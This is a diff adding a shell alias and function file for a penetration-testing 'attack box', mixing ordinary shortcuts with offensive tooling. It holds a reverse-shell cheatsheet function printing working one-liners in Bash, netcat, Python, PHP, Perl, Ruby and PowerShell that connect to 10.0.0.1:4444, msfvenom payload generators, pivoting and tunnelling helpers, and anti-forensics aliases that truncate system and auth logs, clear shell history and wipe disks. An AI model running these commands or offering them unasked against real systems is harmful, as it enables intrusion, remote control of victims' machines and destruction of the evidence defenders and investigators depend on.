@@ -1,0 +1,462 @@
+# OPSEC-Aware Shell Aliases for Attack Box
+# Clean configuration without identifiable information
+
+# ─── GENERAL ALIASES ─────────────────────────────────────────────────────────
+
+alias ll='ls -alFh --color=auto'
+alias la='ls -A --color=auto'
+alias l='ls -CF --color=auto'
+alias cls='clear'
+alias clr='clear'
+alias ..='cd ..'
+alias ...='cd ../..'
+alias ....='cd ../../..'
+alias grep='grep --color=auto'
+alias egrep='egrep --color=auto'
+alias fgrep='fgrep --color=auto'
+
+# File operations with safety
+alias cp='cp -i'
+alias mv='mv -i'
+alias rm='rm -i'
+
+# ─── OPSEC ALIASES ───────────────────────────────────────────────────────────
+
+# Network checks
+alias myip='curl -s ifconfig.me'
+alias checkip='curl -s https://ipinfo.io/ip'
+alias checkdns='cat /etc/resolv.conf'
+alias ports='netstat -tulanp'
+alias listen='lsof -i -P | grep LISTEN'
+alias estab='lsof -i -P | grep ESTABLISHED'
+
+# Process and connection monitoring
+alias checkcon='ss -tupan | grep ESTABLISHED'
+alias checklis='ss -tupan | grep LISTEN'
+alias checkproc='ps auxf | grep -v grep | grep'
+alias psg='ps aux | grep -v grep | grep -i'
+alias pscpu='ps auxf | sort -nr -k 3'
+alias psmem='ps auxf | sort -nr -k 4'
+
+# Emergency and cleanup
+alias panic='emergency-wipe.sh'
+alias emergency-wipe='emergency-wipe.sh'
+alias killcon='killall -9 openvpn ssh sshd nc ncat socat 2>/dev/null'
+alias clean='trash-cleanup.sh'
+alias opsec='opsec-check.sh'
+
+# Cleanup operations
+alias wipe-free='sudo sfill -v /'
+alias clear-logs='sudo find /var/log -type f -exec truncate -s 0 {} \;'
+alias clear-history='history -c && > ~/.bash_history && > ~/.zsh_history'
+alias clear-auth='sudo truncate -s 0 /var/log/auth.log'
+alias shred-file='shred -vfz -n 3'
+
+# Anonymity
+alias anon-on='sudo systemctl start tor && . torsocks on'
+alias anon-off='. torsocks off && sudo systemctl stop tor'
+alias check-tor='curl -s https://check.torproject.org/api/ip'
+
+# ─── NAVIGATION SHORTCUTS ────────────────────────────────────────────────────
+
+alias ops='cd ~/ops'
+alias targets='cd ~/ops/targets'
+alias loot='cd ~/ops/loot'
+alias logs='cd ~/ops/logs'
+alias reports='cd ~/ops/reports'
+alias shells='cd ~/ops/shells'
+alias mount='cd ~/ops/mount'
+alias tools='cd ~/tools'
+alias www='cd /var/www/html'
+alias tmp='cd /tmp'
+alias payloads='cd ~/ops/payloads'
+alias wordlists='cd ~/tools/wordlists'
+alias exploits='cd ~/ops/exploits'
+
+# ─── QUICK SERVERS ───────────────────────────────────────────────────────────
+
+alias serve='python3 -m http.server'
+alias serve80='sudo python3 -m http.server 80'
+alias servephp='php -S 0.0.0.0:8080'
+alias smbserv='impacket-smbserver share . -smb2support'
+alias ftpserv='python3 -m pyftpdlib -p 21 -w'
+
+# ─── REVERSE SHELL CATCHERS ──────────────────────────────────────────────────
+
+alias ncl='nc -nvlp'
+alias ncu='nc -nvu'
+alias socatl='socat TCP-LISTEN:$1,reuseaddr,fork -'
+alias rlwrapl='rlwrap nc -nvlp'
+
+# ─── SSH TUNNEL SHORTCUTS ────────────────────────────────────────────────────
+
+alias socks='function _socks() {
+    local config_name="$1"
+    local port="${2:-1080}"
+    
+    if [ -z "$config_name" ]; then
+        echo "Usage: socks <ssh-config-name> [port]"
+        return 1
+    fi
+    
+    # Kill existing proxy
+    lsof -ti:$port | xargs -r kill -9 2>/dev/null
+    
+    # Start SSH SOCKS proxy
+    ssh -D $port -N -f "$config_name" || return 1
+    
+    # Create temp profile
+    local temp_profile="/tmp/firefox-socks-$$"
+    mkdir -p "$temp_profile"
+    
+# Add proxy settings
+cat > "$temp_profile/user.js" << EOF
+user_pref("network.proxy.type", 1);
+user_pref("network.proxy.socks", "localhost");
+user_pref("network.proxy.socks_port", $port);
+user_pref("network.proxy.socks_version", 5);
+user_pref("network.proxy.socks_remote_dns", true);
+EOF
+    
+    # Use setsid to fully detach and preserve input
+    setsid firefox --profile "$temp_profile" --no-remote https://httpbin.org/ip &
+    
+    echo "✓ Firefox launched with SOCKS proxy"
+}; _socks'
+
+# Enhanced stop function
+alias socks-stop='function _socks_stop() {
+    local port="${1:-1080}"
+    
+    echo -n "Stopping SOCKS proxy on port $port... "
+    lsof -ti:$port | xargs -r kill -9 2>/dev/null && echo "OK" || echo "Not running"
+    
+    # Clean up temp profiles
+    rm -rf /tmp/firefox-socks-* 2>/dev/null
+}; _socks_stop'
+
+# Local port forwarding - Access remote service on local port
+# Usage: ssh-local 8080 target.com 80 user@jumpbox
+ssh-local() {
+    if [ $# -ne 4 ]; then
+        echo "Usage: ssh-local <local-port> <remote-host> <remote-port> <ssh-server>"
+        echo "Example: ssh-local 8080 10.10.10.1 80 user@jumpbox.com"
+        return 1
+    fi
+    echo "[*] Creating local tunnel: localhost:$1 -> $2:$3 via $4"
+    ssh -N -L $1:$2:$3 $4
+}
+
+# Remote port forwarding - Expose local service to remote
+# Usage: ssh-remote 8080 localhost 80 user@public-server  
+ssh-remote() {
+    if [ $# -ne 4 ]; then
+        echo "Usage: ssh-remote <remote-port> <local-host> <local-port> <ssh-server>"
+        echo "Example: ssh-remote 8080 localhost 80 user@public-server.com"
+        return 1
+    fi
+    echo "[*] Creating remote tunnel: $4:$1 -> $2:$3"
+    ssh -N -R $1:$2:$3 $4
+}
+
+# Dynamic SOCKS proxy
+# Usage: ssh-socks 1080 user@target
+ssh-socks() {
+    if [ $# -ne 2 ]; then
+        echo "Usage: ssh-socks <local-port> <ssh-server>"
+        echo "Example: ssh-socks 1080 user@target.com"
+        return 1
+    fi
+    echo "[*] Creating SOCKS proxy on port $1 via $2"
+    echo "[*] Configure browser/proxychains: socks5://127.0.0.1:$1"
+    ssh -N -D $1 $2
+}
+
+# Multi-hop SSH tunnel
+# Usage: ssh-multihop target.internal jumpbox.com
+ssh-multihop() {
+    if [ $# -ne 2 ]; then
+        echo "Usage: ssh-multihop <final-target> <jumpbox>"
+        echo "Example: ssh-multihop root@10.10.10.1 user@jumpbox.com"
+        return 1
+    fi
+    echo "[*] Connecting to $1 via $2"
+    ssh -J $2 $1
+}
+
+# ─── SSHFS MOUNT SHORTCUTS ───────────────────────────────────────────────────
+
+# Mount remote directory via SSHFS
+# Usage: ssh-mount user@host:/path /local/mount
+ssh-mount() {
+    if [ $# -ne 2 ]; then
+        echo "Usage: ssh-mount <user@host:/remote/path> <local-mount-point>"
+        echo "Example: ssh-mount root@target.com:/var/www ~/ops/mount/www"
+        return 1
+    fi
+    mkdir -p $2
+    echo "[*] Mounting $1 to $2"
+    sshfs -o allow_other,default_permissions $1 $2
+}
+
+# Unmount SSHFS
+# Usage: ssh-unmount /local/mount
+ssh-unmount() {
+    if [ $# -ne 1 ]; then
+        echo "Usage: ssh-unmount <local-mount-point>"
+        return 1
+    fi
+    echo "[*] Unmounting $1"
+    fusermount -u $1
+}
+
+# Mount with specific SSH key
+# Usage: ssh-mount-key user@host:/path /local/mount /path/to/key
+ssh-mount-key() {
+    if [ $# -ne 3 ]; then
+        echo "Usage: ssh-mount-key <user@host:/remote/path> <local-mount> <ssh-key>"
+        return 1
+    fi
+    mkdir -p $2
+    echo "[*] Mounting $1 to $2 using key $3"
+    sshfs -o allow_other,default_permissions,IdentityFile=$3 $1 $2
+}
+
+# ─── TOOL SHORTCUTS ──────────────────────────────────────────────────────────
+
+# Metasploit
+alias msf='msfconsole -q'
+alias msfup='msfupdate'
+alias msfrpc='msfrpcd -U msf -P msf -a 127.0.0.1'
+
+# Nmap shortcuts
+alias nmap-full='nmap -sC -sV -O -p- -T4'
+alias nmap-udp='sudo nmap -sU -sV --top-ports 1000'
+alias nmap-vuln='nmap -sV --script=vuln'
+alias nmap-smb='nmap -sV -p 445 --script=smb-enum-shares,smb-enum-users'
+
+# Tool updates
+alias update-tools='update-all-tools.sh'
+alias update-searchsploit='searchsploit -u'
+alias update-nmap-scripts='sudo nmap --script-updatedb'
+
+# Quick tool access
+alias kerb='kerbrute'
+alias responder='sudo responder -I eth0 -wFv'
+alias crack='crackmapexec'
+alias evil='evil-winrm -i'
+alias bloodhound-start='sudo neo4j start && bloodhound'
+
+# ─── ENCODING/DECODING ───────────────────────────────────────────────────────
+
+alias b64d='base64 -d'
+alias b64e='base64 -w 0'
+alias urldecode='python3 -c "import sys, urllib.parse as ul; print(ul.unquote(sys.stdin.read()))"'
+alias urlencode='python3 -c "import sys, urllib.parse as ul; print(ul.quote(sys.stdin.read()))"'
+alias hexdump='od -A x -t x1z -v'
+alias rot13='tr "A-Za-z" "N-ZA-Mn-za-m"'
+
+# ─── METASPLOIT PAYLOAD GENERATORS ───────────────────────────────────────────
+
+alias msfpayloads='msfvenom -l payloads'
+alias msfencoders='msfvenom -l encoders'
+alias winrev='msfvenom -p windows/x64/shell_reverse_tcp LHOST=$1 LPORT=$2 -f exe -o shell.exe'
+alias linrev='msfvenom -p linux/x64/shell_reverse_tcp LHOST=$1 LPORT=$2 -f elf -o shell.elf'
+alias phprev='msfvenom -p php/reverse_php LHOST=$1 LPORT=$2 -f raw -o shell.php'
+alias asprev='msfvenom -p windows/shell_reverse_tcp LHOST=$1 LPORT=$2 -f asp -o shell.asp'
+alias jsprev='msfvenom -p java/jsp_shell_reverse_tcp LHOST=$1 LPORT=$2 -f raw -o shell.jsp'
+alias warrev='msfvenom -p java/jsp_shell_reverse_tcp LHOST=$1 LPORT=$2 -f war -o shell.war'
+
+# ─── WORDLIST SHORTCUTS ──────────────────────────────────────────────────────
+
+alias rockyou='locate rockyou.txt | head -1'
+alias seclists='cd ~/tools/wordlists/SecLists'
+alias dirmedium='locate directory-list-2.3-medium.txt | head -1'
+alias submedium='locate subdomains-top1million-110000.txt | head -1'
+
+# ─── PROXYCHAINS ─────────────────────────────────────────────────────────────
+
+alias pc='proxychains4 -q'
+alias pcnmap='proxychains4 -q nmap -sT -Pn'
+
+# ─── CHISEL SHORTCUTS ────────────────────────────────────────────────────────
+
+alias chisel-server='chisel server -p 8000 --reverse'
+alias chisel-client='chisel client $1:8000 R:socks'
+
+# ─── QUICK FUNCTIONS ─────────────────────────────────────────────────────────
+
+# Extract various archive types
+extract() {
+    if [ -f $1 ]; then
+        case $1 in
+            *.tar.bz2)   tar xjf $1   ;;
+            *.tar.gz)    tar xzf $1   ;;
+            *.bz2)       bunzip2 $1   ;;
+            *.rar)       unrar x $1   ;;
+            *.gz)        gunzip $1    ;;
+            *.tar)       tar xf $1    ;;
+            *.tbz2)      tar xjf $1   ;;
+            *.tgz)       tar xzf $1   ;;
+            *.zip)       unzip $1     ;;
+            *.Z)         uncompress $1;;
+            *.7z)        7z x $1      ;;
+            *)           echo "'$1' cannot be extracted" ;;
+        esac
+    else
+        echo "'$1' is not a valid file"
+    fi
+}
+
+# Create backup of file
+backup() {
+    cp "$1" "${1}.$(date +%Y%m%d_%H%M%S).bak"
+}
+
+# Quick nmap scans
+quickscan() {
+    echo "[*] Quick scan of $1"
+    nmap -sV -sC -O -T4 -n -Pn -oA quickscan_$1 $1
+}
+
+fullscan() {
+    echo "[*] Full scan of $1"
+    nmap -sV -sC -O -T4 -n -Pn -p- -oA fullscan_$1 $1
+}
+
+udpscan() {
+    echo "[*] UDP scan of $1"
+    sudo nmap -sU -sV --top-ports 1000 -oA udpscan_$1 $1
+}
+
+# Reverse shell cheatsheet
+revshells() {
+    echo "===== Reverse Shell Cheatsheet ====="
+    echo "Bash:"
+    echo "  bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+    echo ""
+    echo "Bash (alternative):"
+    echo "  0<&196;exec 196<>/dev/tcp/10.0.0.1/4444; sh <&196 >&196 2>&196"
+    echo ""
+    echo "Netcat:"
+    echo "  nc -e /bin/bash 10.0.0.1 4444"
+    echo "  nc -c bash 10.0.0.1 4444"
+    echo "  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f"
+    echo ""
+    echo "Python:"
+    echo "  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
+    echo ""
+    echo "Python3:"
+    echo "  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
+    echo ""
+    echo "PHP:"
+    echo "  php -r '\$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/bash <&3 >&3 2>&3\");'"
+    echo "  php -r '\$sock=fsockopen(\"10.0.0.1\",4444);shell_exec(\"/bin/bash <&3 >&3 2>&3\");'"
+    echo "  php -r '\$sock=fsockopen(\"10.0.0.1\",4444);\$proc=proc_open(\"/bin/bash\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);'"
+    echo ""
+    echo "Perl:"
+    echo "  perl -e 'use Socket;\$i=\"10.0.0.1\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
+    echo ""
+    echo "Ruby:"
+    echo "  ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4444).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"
+    echo ""
+    echo "PowerShell:"
+    echo "  powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
+}
+
+# Upgrade shell
+upgradeshell() {
+    echo "===== Shell Upgrade Commands ====="
+    echo "Python:"
+    echo "  python -c 'import pty;pty.spawn(\"/bin/bash\")'"
+    echo "  python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
+    echo ""
+    echo "Script:"
+    echo "  script -q /dev/null -c bash"
+    echo ""
+    echo "Then:"
+    echo "  export TERM=xterm"
+    echo "  export SHELL=bash"
+    echo "  stty rows 24 cols 80"
+    echo ""
+    echo "Background with Ctrl+Z, then:"
+    echo "  stty raw -echo;fg"
+    echo ""
+    echo "For zsh shell:"
+    echo "  python3 -c 'import pty;pty.spawn(\"/bin/zsh\")'"
+}
+
+# Quick HTTP server with upload capability
+upload_server() {
+    echo "Starting upload server on port 8080..."
+    python3 -c 'import http.server,socketserver,cgi,os;os.chdir("/tmp");class SimpleHTTPRequestHandlerWithUpload(http.server.SimpleHTTPRequestHandler):
+ def do_POST(self):
+  if self.path=="/upload":
+   form=cgi.FieldStorage(fp=self.rfile,headers=self.headers,environ={"REQUEST_METHOD":"POST","CONTENT_TYPE":self.headers["Content-Type"]})
+   filename=form["file"].filename
+   data=form["file"].file.read()
+   with open(filename,"wb")as f:f.write(data)
+   self.send_response(200)
+   self.end_headers()
+   self.wfile.write(b"Upload successful")
+  else:self.send_error(404)
+httpd=socketserver.TCPServer(("",8080),SimpleHTTPRequestHandlerWithUpload);print("Upload server at http://0.0.0.0:8080/upload");httpd.serve_forever()'
+}
+
+# Check all running services
+checkservices() {
+    echo "===== Running Services ====="
+    systemctl list-units --type=service --state=running
+}
+
+# Download file to target
+download() {
+    if [ $# -ne 2 ]; then
+        echo "Usage: download <URL> <output-file>"
+        return 1
+    fi
+    echo "[*] Downloading $1 to $2"
+    curl -s -L "$1" -o "$2" || wget -q "$1" -O "$2"
+}
+
+# Git shortcuts
+alias gs='git status'
+alias ga='git add'
+alias gc='git commit -m'
+alias gp='git push'
+alias gl='git log --oneline'
+alias gd='git diff'
+
+# Docker shortcuts
+alias dps='docker ps'
+alias dpsa='docker ps -a'
+alias dimg='docker images'
+alias dexec='docker exec -it'
+alias dlog='docker logs'
+alias dstop='docker stop $(docker ps -q)'
+alias drm='docker rm $(docker ps -a -q)'
+alias drmi='docker rmi $(docker images -q)'
+
+# ─── VIRTUAL ENVIRONMENT ALIASES ───────────────────────────────────────────────────────────
+
+alias venv-create='python3 -m venv venv; source venv/bin/activate; pip install -r requirements.txt'
+alias venv-activate='source venv/bin/activate'
+
+# ─── BURP PROXY ALIASES ───────────────────────────────────────────────────────────
+
+alias burp_proxy='export https_proxy=http://127.0.0.1:8080; export http_proxy=$https_proxy; export NO_PROXY=169.254.169.254; echo "Burp proxy enabled: $http_proxy"'
+alias disable_burp_proxy='unset https_proxy; unset http_proxy; unset NO_PROXY; echo "Burp proxy disabled"'
+
+# ─── RED TEAM VPN MONITORING ──────────────────────────────────────────────
+
+# Safe OPSEC status check
+alias opsec-status='echo "🔍 OPSEC Status:"; echo "VPN: $(pgrep openvpn > /dev/null && echo "🔒 Connected" || echo "❌ Disconnected")"; echo "Tor: $(systemctl is-active tor 2>/dev/null | grep -q active && echo "🔒 Active" || echo "❌ Inactive")"; echo "IP: $(curl -s --max-time 2 ifconfig.me || echo "Check failed")"'
+
+# Network status for red team ops
+alias net-status='echo "=== Network Status ==="; ip route | grep -E "tun|tor|vpn" || echo "No VPN/Tor interfaces"; echo ""; echo "=== External IP ==="; curl -s --max-time 3 ifconfig.me || echo "IP check failed"'
+
+# Quick OPSEC check
+alias quick-opsec='opsec-status && echo "" && echo "=== Connections ===" && ss -tupln | grep -E ":443|:9050|:1080" | head -5'
+
+# Tool paths
+export PATH=$PATH:~/tools:~/.cargo/bin:~/go/bin:/usr/local/bin
